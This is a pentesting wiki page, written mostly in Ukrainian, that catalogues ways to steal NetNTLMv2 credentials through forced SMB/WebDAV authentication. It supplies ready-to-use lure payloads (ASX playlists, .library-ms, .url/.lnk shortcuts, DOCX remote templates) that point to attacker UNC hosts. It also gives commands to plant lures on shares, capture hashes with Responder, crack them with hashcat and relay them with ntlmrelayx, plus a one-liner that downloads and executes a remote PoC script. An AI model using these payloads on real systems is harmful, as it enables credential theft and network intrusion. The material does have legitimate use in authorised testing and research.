# Де можна вкрасти NTLM creds

{{#include ../../banners/hacktricks-training.md}}

**Перегляньте всі чудові ідеї з [https://osandamalith.com/2017/03/24/places-of-interest-in-stealing-netntlm-hashes/](https://osandamalith.com/2017/03/24/places-of-interest-in-stealing-netntlm-hashes/) від download of a microsoft word file online до ntlm leaks source: https://github.com/soufianetahiri/TeamsNTLMLeak/blob/main/README.md і [https://github.com/p0dalirius/windows-coerced-authentication-methods](https://github.com/p0dalirius/windows-coerced-authentication-methods)**

### Writable SMB share + Explorer-triggered UNC lures (ntlm_theft/SCF/LNK/library-ms/desktop.ini)

Якщо ви можете **писати до share, який users або scheduled jobs переглядають у Explorer**, розмістіть файли, чиї metadata вказують на ваш UNC (наприклад, `\\ATTACKER\share`). Rendering folder запускає **implicit SMB authentication** і витікає **NetNTLMv2** до вашого listener.

1. **Generate lures** (covers SCF/URL/LNK/library-ms/desktop.ini/Office/RTF/etc.)
```bash
git clone https://github.com/Greenwolf/ntlm_theft && cd ntlm_theft
uv add --script ntlm_theft.py xlsxwriter
uv run ntlm_theft.py -g all -s <attacker_ip> -f lure
```
2. **Скиньте їх на записуваний share** (будь-яку папку, яку відкриє жертва):
```bash
smbclient //victim/share -U 'guest%'
cd transfer\
prompt off
mput lure/*
```
3. **Слухати і crack**:
```bash
sudo responder -I <iface>          # capture NetNTLMv2
hashcat hashes.txt /opt/SecLists/Passwords/Leaked-Databases/rockyou.txt  # autodetects mode 5600
```
Windows може одночасно звертатися до кількох файлів; усе, що Explorer попередньо переглядає (`BROWSE TO FOLDER`), не потребує кліків.

### Плейлисти Windows Media Player (.ASX/.WAX)

Якщо вам удасться змусити ціль відкрити або попередньо переглянути плейлист Windows Media Player, який ви контролюєте, ви можете leak Net‑NTLMv2, вказавши для запису UNC path. WMP спробує отримати пов’язаний media через SMB і неявно пройде authentication.

Приклад payload:
```xml
<asx version="3.0">
<title>Leak</title>
<entry>
<title></title>
<ref href="file://ATTACKER_IP\\share\\track.mp3" />
</entry>
</asx>
```
Потік збору та cracking:
```bash
# Capture the authentication
sudo Responder -I <iface>

# Crack the captured NetNTLMv2
hashcat hashes.txt /opt/SecLists/Passwords/Leaked-Databases/rockyou.txt
```
### ZIP-embedded .library-ms NTLM leak (CVE-2025-24071/24055)

Windows Explorer небезпечно обробляє файли .library-ms, коли їх відкривають безпосередньо з ZIP-архіву. Якщо визначення library вказує на віддалений UNC-шлях (наприклад, \\attacker\share), простого перегляду/запуску .library-ms всередині ZIP достатньо, щоб Explorer перелічив UNC і відправив NTLM authentication атакувальнику. Це дає NetNTLMv2, який можна зламати офлайн або, можливо, relay-нути.

Мінімальний .library-ms, що вказує на attacker UNC
```xml
<?xml version="1.0" encoding="UTF-8"?>
<libraryDescription xmlns="http://schemas.microsoft.com/windows/2009/library">
<version>6</version>
<name>Company Documents</name>
<isLibraryPinned>false</isLibraryPinned>
<iconReference>shell32.dll,-235</iconReference>
<templateInfo>
<folderType>{7d49d726-3c21-4f05-99aa-fdc2c9474656}</folderType>
</templateInfo>
<searchConnectorDescriptionList>
<searchConnectorDescription>
<simpleLocation>
<url>\\10.10.14.2\share</url>
</simpleLocation>
</searchConnectorDescription>
</searchConnectorDescriptionList>
</libraryDescription>
```
Операційні кроки
- Створіть файл .library-ms з XML вище (встановіть свій IP/hostname).
- Zip його (на Windows: Send to → Compressed (zipped) folder) і доставте ZIP на target.
- Запустіть NTLM capture listener і зачекайте, поки victim відкриє .library-ms зсередини ZIP.


### Outlook calendar reminder sound path (CVE-2023-23397) – zero‑click Net‑NTLMv2 leak

Microsoft Outlook for Windows обробляв extended MAPI property PidLidReminderFileParameter у calendar items. Якщо ця property вказувала на UNC path (наприклад, \\attacker\share\alert.wav), Outlook звертався до SMB share, коли reminder спрацьовував, витікаючи Net‑NTLMv2 користувача без будь-якого click. Це було patched 14 березня 2023 року, але це все ще дуже relevant для legacy/untouched fleets і для historical incident response.

Quick exploitation with PowerShell (Outlook COM):
```powershell
# Run on a host with Outlook installed and a configured mailbox
IEX (iwr -UseBasicParsing https://raw.githubusercontent.com/api0cradle/CVE-2023-23397-POC-Powershell/main/CVE-2023-23397.ps1)
Send-CalendarNTLMLeak -recipient user@example.com -remotefilepath "\\10.10.14.2\share\alert.wav" -meetingsubject "Update" -meetingbody "Please accept"
# Variants supported by the PoC include \\host@80\file.wav and \\host@SSL@443\file.wav
```
Сторона listener:
```bash
sudo responder -I eth0  # or impacket-smbserver to observe connections
```
Notes
- Жертві потрібно лише мати запущений Outlook for Windows, коли спрацьовує reminder.
- leak дає Net‑NTLMv2, придатний для offline cracking або relay (не pass‑the‑hash).


### .LNK/.URL icon-based zero‑click NTLM leak (CVE-2025-50154 – bypass of CVE-2025-24054)

Windows Explorer автоматично рендерить значки shortcuts. Нещодавні дослідження показали, що навіть після квітневого 2025 patch від Microsoft для UNC‑icon shortcuts усе ще було можливо викликати NTLM authentication без кліків, розмістивши target shortcut на UNC path і залишивши icon локальним (patch bypass отримав CVE-2025-50154). Просто перегляд folder змушує Explorer отримувати metadata з remote target, надсилаючи NTLM на SMB server атакувальника.

Minimal Internet Shortcut payload (.url):
```ini
[InternetShortcut]
URL=http://intranet
IconFile=\\10.10.14.2\share\icon.ico
IconIndex=0
```
Program Shortcut payload (.lnk) via PowerShell:
```powershell
$lnk = "$env:USERPROFILE\Desktop\lab.lnk"
$w = New-Object -ComObject WScript.Shell
$sc = $w.CreateShortcut($lnk)
$sc.TargetPath = "\\10.10.14.2\share\payload.exe"  # remote UNC target
$sc.IconLocation = "C:\\Windows\\System32\\SHELL32.dll" # local icon to bypass UNC-icon checks
$sc.Save()
```
Ідеї для delivery
- Drop the shortcut у ZIP і змусь жертву відкрити його.
- Place the shortcut на writable share, який жертва відкриє.
- Combine з іншими lure files у тій самій папці, щоб Explorer preview-ив items.

### No-click .LNK NTLM leak via ExtraData icon path (CVE‑2026‑25185)

Windows loads `.lnk` metadata during **view/preview** (icon rendering), not only on execution. CVE‑2026‑25185 показує parsing path, де блоки **ExtraData** змушують shell resolve icon path і торкатися filesystem **during load**, emitting outbound NTLM, коли path є remote.

Key trigger conditions (observed in `CShellLink::_LoadFromStream`):
- Include **DARWIN_PROPS** (`0xa0000006`) in ExtraData (gate to icon update routine).
- Include **ICON_ENVIRONMENT_PROPS** (`0xa0000007`) with **TargetUnicode** populated.
- The loader expands environment variables in `TargetUnicode` and calls `PathFileExistsW` on the resulting path.

If `TargetUnicode` resolves to a UNC path (e.g., `\\attacker\share\icon.ico`), **merely viewing a folder** containing the shortcut causes outbound authentication. The same load path can also be hit by **indexing** and **AV scanning**, making it a practical no‑click leak surface.

Research tooling (parser/generator/UI) is available in the **LnkMeMaybe** project to build/inspect these structures without using the Windows GUI.


### WebDAV auth coercion / credential validation via `davclnt.dll,DavSetCookie`

The native **WebDAV client** can be abused to force the current logon session to authenticate to an arbitrary **HTTP/WebDAV** endpoint:
```cmd
rundll32.exe davclnt.dll,DavSetCookie <HOST> http://<TARGET>/C$/Windows
```
Чому це корисно:
- Проти **attacker-controlled WebDAV server** це може викликати **NTLM over HTTP** без запуску custom client.
- Проти **internal hosts** це тихий спосіб **перевірити, де вкрадені credentials приймаються** перед lateral movement.
- Команда є хорошою альтернативою, коли **SMB egress filtered**, але **HTTP/WebDAV** все ще reachable.

Operational notes:
- Сервіс **WebClient** має бути запущений на source host.
- `rundll32.exe` завантажує `davclnt.dll` і змушує Windows обробляти WebDAV authentication, використовуючи **current user's credentials**.
- Якщо ви вказуєте інфраструктуру, яку контролюєте, використовуйте NTLM-aware HTTP listener/relay, такий як:
```bash
# Capture or relay NTLM over HTTP/WebDAV
ntlmrelayx.py -t smb://<TARGET> --http-port 80
```
З точки зору виявлення, повторні виконання `rundll32.exe davclnt.dll,DavSetCookie` проти багатьох внутрішніх систем є сильним сигналом **credential validation / spray-like lateral movement prep** замість звичайної поведінки користувача.

### Office remote template injection (.docx/.dotm) to coerce NTLM

Office documents can reference an external template. If you set the attached template to a UNC path, opening the document will authenticate to SMB.

Minimal DOCX relationship changes (inside word/):

1) Edit word/settings.xml and add the attached template reference:
```xml
<w:attachedTemplate r:id="rId1337" xmlns:w="http://schemas.openxmlformats.org/wordprocessingml/2006/main" xmlns:r="http://schemas.openxmlformats.org/officeDocument/2006/relationships"/>
```
2) Відредагуйте word/_rels/settings.xml.rels і вкажіть rId1337 на свій UNC:
```xml
<Relationship Id="rId1337" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/attachedTemplate" Target="\\\\10.10.14.2\\share\\template.dotm" TargetMode="External" xmlns="http://schemas.openxmlformats.org/package/2006/relationships"/>
```
3) Перепакуйте в .docx і доставте. Запустіть свій SMB capture listener і чекайте на відкриття.

Для ідей після capture щодо relaying або abuse NTLM, дивіться:

{{#ref}}
README.md
{{#endref}}


## References
- [HTB: Breach – Writable share lures + Responder capture → NetNTLMv2 crack → Kerberoast svc_mssql](https://0xdf.gitlab.io/2026/02/10/htb-breach.html)
- [HTB Fluffy – ZIP .library‑ms auth leak (CVE‑2025‑24071/24055) → GenericWrite → AD CS ESC16 to DA (0xdf)](https://0xdf.gitlab.io/2025/09/20/htb-fluffy.html)
- [HTB: Media — WMP NTLM leak → NTFS junction to webroot RCE → FullPowers + GodPotato to SYSTEM](https://0xdf.gitlab.io/2025/09/04/htb-media.html)
- [Morphisec – 5 NTLM vulnerabilities: Unpatched privilege escalation threats in Microsoft](https://www.morphisec.com/blog/5-ntlm-vulnerabilities-unpatched-privilege-escalation-threats-in-microsoft/)
- [MSRC – Microsoft mitigates Outlook EoP (CVE‑2023‑23397) and explains the NTLM leak via PidLidReminderFileParameter](https://www.microsoft.com/en-us/msrc/blog/2023/03/microsoft-mitigates-outlook-elevation-of-privilege-vulnerability/)
- [Cymulate – Zero‑click, one NTLM: Microsoft security patch bypass (CVE‑2025‑50154)](https://cymulate.com/blog/zero-click-one-ntlm-microsoft-security-patch-bypass-cve-2025-50154/)
- [TrustedSec – LnkMeMaybe: A Review of CVE‑2026‑25185](https://trustedsec.com/blog/lnkmemaybe-a-review-of-cve-2026-25185)
- [TrustedSec LnkMeMaybe tooling](https://github.com/trustedsec/LnkMeMaybe)
- [Rapid7 – When IT Support Calls: Dissecting a ModeloRAT Campaign from Teams to Domain Compromise](https://www.rapid7.com/blog/post/tr-it-support-dissecting-modelorat-campaign-microsoft-teams-compromise)
- [Microsoft Learn – davclnt.h header](https://learn.microsoft.com/en-us/windows/win32/api/davclnt/)
- [Splunk – Windows Rundll32 WebDAV Request](https://research.splunk.com/endpoint/320099b7-7eb1-4153-a2b4-decb53267de2/)


{{#include ../../banners/hacktricks-training.md}}
